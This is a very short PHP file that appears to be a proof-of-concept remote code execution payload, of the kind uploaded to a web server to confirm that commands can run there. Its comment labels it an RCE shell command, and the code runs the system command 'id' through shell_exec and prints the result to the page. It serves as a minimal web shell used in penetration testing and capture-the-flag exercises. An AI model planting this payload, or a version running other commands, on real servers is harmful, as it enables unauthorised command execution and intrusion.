<?php
// This would be the shell command to execute (RCE)
$output = shell_exec('id');
echo "<pre>$output</pre>";
?>
